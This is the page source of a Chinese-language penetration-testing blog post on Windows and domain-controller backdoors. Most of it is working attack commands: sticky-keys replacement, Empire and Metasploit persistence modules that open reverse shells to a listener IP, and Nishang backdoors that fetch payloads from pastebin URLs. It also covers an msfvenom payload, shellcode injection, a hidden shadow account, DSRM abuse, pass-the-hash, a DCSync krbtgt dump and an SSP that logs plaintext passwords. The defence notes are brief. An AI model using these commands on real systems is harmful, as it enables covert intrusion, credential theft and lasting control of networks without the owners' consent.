@@ -1,0 +1,419 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Windows中的后门 | V3teran's blog</title><meta name="keywords" content="域,票据,Hash,后门,令牌"><meta name="author" content="V3teran"><meta name="copyright" content="V3teran"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="windows本地粘滞键本机执行 12move sethc.exe sethc.exe.bak copy cmd.exe sethc.exe  empire 12345usemodule lateral_movement&#x2F;invoke_wmi_debugger set Listener fxxx set ComputerName win7.holy.testA set TargetBinary s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows中的后门">
+<meta property="og:url" content="https://v3teran.github.io/2021/02/24/242bb859.html">
+<meta property="og:site_name" content="V3teran&#39;s blog">
+<meta property="og:description" content="windows本地粘滞键本机执行 12move sethc.exe sethc.exe.bak copy cmd.exe sethc.exe  empire 12345usemodule lateral_movement&#x2F;invoke_wmi_debugger set Listener fxxx set ComputerName win7.holy.testA set TargetBinary s">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210224160908.jpeg">
+<meta property="article:published_time" content="2021-02-24T14:00:00.000Z">
+<meta property="article:modified_time" content="2022-03-02T01:01:20.737Z">
+<meta property="article:author" content="V3teran">
+<meta property="article:tag" content="域">
+<meta property="article:tag" content="票据">
+<meta property="article:tag" content="Hash">
+<meta property="article:tag" content="后门">
+<meta property="article:tag" content="令牌">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210224160908.jpeg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204173816.png"><link rel="canonical" href="https://v3teran.github.io/2021/02/24/242bb859"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?73d3a03f02aa81722a03a54ce37d7aac";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-221762089-2"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'UA-221762089-2');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Windows中的后门',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-02 09:01:20'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/lalala.css"><link rel="stylesheet" href="https://at.alicdn.com/t/font_2364346_8smao36j8yr.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><script src="/live2d-widget/autoload.js"></script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper/swiper-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-card-history/baiduhistory/css/main.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204173845.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210224160908.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">V3teran's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Windows中的后门</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-24T14:00:00.000Z" title="发表于 2021-02-24 22:00:00">2021-02-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-02T01:01:20.737Z" title="更新于 2022-03-02 09:01:20">2022-03-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Windows中的后门"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="windows本地"><a href="#windows本地" class="headerlink" title="windows本地"></a><strong>windows本地</strong></h1><h2 id="粘滞键"><a href="#粘滞键" class="headerlink" title="粘滞键"></a><strong>粘滞键</strong></h2><p><strong>本机执行</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">move</span> sethc.exe sethc.exe.bak </span><br><span class="line"><span class="built_in">copy</span> <span class="built_in">cmd</span>.exe sethc.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>empire</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_wmi_debugger </span><br><span class="line">set Listener fxxx </span><br><span class="line">set ComputerName win7.holy.testA </span><br><span class="line">set TargetBinary sethc.exe </span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p>执行后在登录界面按5次shift，实测本地管理员账户成功。（登录后按则返回账户本身权限）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224185826.png"></p>
+<h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>在普通用户权限下，可将后门脚本路径填写到注册表键，键名任意设置。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU:Software\Micresoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
+
+<p><strong>empire</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/userland/registry </span><br><span class="line">set Listener fxxx set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p>运行模块后，会在目标主机添加一个启动项，当登录系统时便会运行，反弹shell，只对当前用户有效。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224185955.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224190026.png"></p>
+<p>在system权限下可写入如下目录，这样任意用户登录都会反弹各自账户权限的shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RegPath HKLM:Software\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
+
+<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a><strong>计划任务</strong></h2><p>请参考：<a target="_blank" rel="noopener" href="http://blog.v3teran.xyz/2021/02/14/%E5%9F%BA%E4%BA%8Ewindows%E6%9C%AC%E5%9C%B0%E7%9A%84%E6%8F%90%E6%9D%83/">http://blog.v3teran.xyz/2021/02/14/%E5%9F%BA%E4%BA%8Ewindows%E6%9C%AC%E5%9C%B0%E7%9A%84%E6%8F%90%E6%9D%83/</a></p>
+<h2 id="meterpreter后门"><a href="#meterpreter后门" class="headerlink" title="meterpreter后门"></a><strong>meterpreter后门</strong></h2><p>persistence，自带的持久性后门程序，因为一般的exp打进去以后断开一次会连不上，得再打一次。</p>
+<ul>
+<li>-A 自动启动一个匹配的exploit&#x2F;multi&#x2F;handler来连接到代理 </li>
+<li>-L 如果未使用％TEMP％，则在目标主机中写入有效负载的位置。 </li>
+<li>-P 有效负载使用，默认为windows&#x2F;meterpreter&#x2F;reverse_tcp。 </li>
+<li>-S 作为服务自动启动该木马（具有SYSTEM权限） </li>
+<li>-T 要使用的备用可执行模板 </li>
+<li>-U 用户登录时自动启动该木马 </li>
+<li>-X 系统引导时自动启动该木马 </li>
+<li>-h 这个帮助菜单 </li>
+<li>-i 每次连接尝试之间的时间间隔（秒）</li>
+<li>-p 运行Metasploit的系统正在侦听的端口</li>
+<li>-r 运行Metasploit监听连接的系统的IP</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run persistence -U -i 5 -p 4444 -r 172.16.1.7</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224190522.png"></p>
+<p>向注册表添加键值，自动运行进程进行反弹。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224190637.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224190603.png"></p>
+<h2 id="Cymothoa"><a href="#Cymothoa" class="headerlink" title="Cymothoa"></a><strong>Cymothoa</strong></h2><p>可以将shellcode注入到现有进程，所拥有的权限和注入的进程权限是相同的，伪装成常规程序，与被注入的程序共存，只要不检查内存就发现不了。需要将Cymothoa上传到目标系统中。</p>
+<ul>
+<li>-s  指定使用的shellcode </li>
+<li>-p  指定注入的进程的pid  </li>
+<li>-y  指定payload的服务端口</li>
+</ul>
+<p>寻找合适注入的进程。高权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux|grep apache</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224191206.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cymothoa -s 1 -p 11002 -y 6666</span><br></pre></td></tr></table></figure>
+
+<p>注入成功后用nc连接。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc IP 6666</span><br></pre></td></tr></table></figure>
+
+<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a><strong>WMI</strong></h2><p>只能管理员权限用户运行。powershell编写，不会在磁盘中留下文件。</p>
+<p>无文件无进程：将代码加密存储在WMI中，任务执行后进程会消失。</p>
+<p><strong>empire</strong></p>
+<p>本地设置监听。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/elevated/wmi </span><br><span class="line">set Listener fxxx</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224191254.png"></p>
+<p>在目标机器写入后门。两分钟后会自动反弹shell，权限system。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter &quot;Name=&#x27;updater&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224191526.png"></p>
+<p>重启后等待几分钟，不用登录即可获取权限。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224191532.png"></p>
+<p><strong>防御</strong></p>
+<ol>
+<li>删除自动运行列表中的恶意WMI。</li>
+<li>使用Get-WMIObject命令删除。</li>
+</ol>
+<h2 id="Nishang"><a href="#Nishang" class="headerlink" title="Nishang"></a><strong>Nishang</strong></h2><p><strong>HTTP-Backdoor</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\HTTP-Backdoor.ps1 </span><br><span class="line">HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information --MagicString start123 -StopString stopthis</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>CheckURL 给出一个URL地址，页面中如果存在MagicString中的值，就去执行Payload，下载运行脚本。 </li>
+<li>PayloadURL 需要下载的Powershell脚本的地址。 </li>
+<li>Arguments 指定要执行的函数。 </li>
+<li>StopString 这个参数也会去看是否存在我们CheckURL返回的字符串，如果存在就会停止执行。</li>
+</ul>
+<p><strong>Add-ScrnSaveBackdoor</strong></p>
+<p>利用屏幕保护程序插入后门。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Add-ScrnSaveBackdoor -Payload &quot;powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process&quot; </span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.1.7 LPORT=8443 -f powershell -o test.ps1 </span><br><span class="line">Add-ScrnSaveBackdoor -PayloadURL http://172.16.1.1/test.ps1</span><br></pre></td></tr></table></figure>
+
+<p><strong>Execute-OnTime</strong></p>
+<p>与http-backdoor类似，只增加了定时功能。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Execute-OnTime -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload</span><br></pre></td></tr></table></figure>
+
+<p><strong>Invoke-ADSBackdoor</strong></p>
+<p>在NTFS数据流中留下一个永久性后门，该脚本用于向ADS注入代码并以普通用户权限运行。远程加载。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-ADSBackdoor -PayloadURL http://172.16.1.1/test.txt</span><br></pre></td></tr></table></figure>
+
+<p>只能通过dir &#x2F;r &#x2F;a看到。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224192001.png"></p>
+<h2 id="影子账户"><a href="#影子账户" class="headerlink" title="影子账户"></a><strong>影子账户</strong></h2><p>server2008及以上只能在注册表和用户管理中看到，可在net user中隐藏。</p>
+<p>administrator$</p>
+<h1 id="基于域控"><a href="#基于域控" class="headerlink" title="基于域控"></a><strong>基于域控</strong></h1><h2 id="DSRM"><a href="#DSRM" class="headerlink" title="DSRM"></a><strong>DSRM</strong></h2><p>目录服务恢复模式，DC中的安全模式启动选项。DC中的本地管理员用户就是DSRM用户（只能通过网络登录），在域环境出现问题时可使用其修复。DSRM用户密码在创建DC时设置，若修改密码需要使用ntdsutil工具。</p>
+<p>ps：在安装了KB961320补丁的Windows Server 2008以及之后发布的Windows Server中，支持DSRM密码同步成指定的域账户密码，win2003版本无法利用。</p>
+<p><strong>修改密码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe </span><br><span class="line">set dsrm password </span><br><span class="line">reset password on server DC </span><br><span class="line">q </span><br><span class="line">q</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224192442.png"></p>
+<p><strong>同步密码</strong></p>
+<p>由于krbtgt未设置密码，同步了其他域管用户的hash，正常情况可以同步krbtgt用户。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe </span><br><span class="line">set dsrm password </span><br><span class="line">sync from domain account testuser </span><br><span class="line">q </span><br><span class="line">q</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224192558.png"></p>
+<p>可通过mimikatz查看是否同步成功，本地管理员用户hash已更改。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">token::elevate </span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224193417.png"></p>
+<p><strong>修改DSRM登录方式</strong></p>
+<p>三种登录方式：</p>
+<ul>
+<li>0：默认，当DC重启并进入DSRM模式时才可使用该账号。   bcdedit &#x2F;set safeboot dsrepair </li>
+<li>1：只有当本地AD、DS服务停止时，才可使用该账号。 </li>
+<li>2：任何情况下都可使用该账号。</li>
+</ul>
+<p>在注册表中新建项。系统默认不存在。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224193536.png"></p>
+<p>通过powershell添加也可以。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NEW-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224193605.png"></p>
+<p><strong>使用DSRM账号远程登录DC</strong></p>
+<p>利用pth。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::pth /domain:dc /user:administrator /ntlm:8acxxxxxxxxxxxxxxxxb3209</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224193735.png"></p>
+<p>可进行进一步操作，如使用mimikatz远程转储krbtgt的ntlm hash等。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">lsadump::dcsync /user:krbtgt /domain:holy.testA</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御</strong></p>
+<ol>
+<li>监控与DSRM密码重置和使用相关的事件日志4794：试图设置目录服务还原模式管理员密码；</li>
+<li>监控如下注册表位置的值HKLM\System\CurrentControlSet\Control\Lsa\DSRMAdminLogonBehavior，当值为1或2时应引起警示。</li>
+</ol>
+<h2 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a><strong>SSP</strong></h2><p>SSP是个DLL文件，实现身份认证功能。</p>
+<p>SSPI是SSP的API接口。</p>
+<p>若获得SYSETM权限，可以进行持久化，原理是LSA身份验证。lsass.exe在系统启动时加载SSP，若对LSA进行扩展，自定义恶意DLL文件，则在系统启动时就能获取lsass.exe进程中的明文密码，这样即使密码被修改也可以重新获取。</p>
+<p><strong>方法一：不需重启</strong></p>
+<p>在DC中使用mimikatz。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224194107.png"></p>
+<p>随后注销重新登录（若重启恶意DLL会失效），账号密码明文会存储在system32目录下mimilsa.log中。</p>
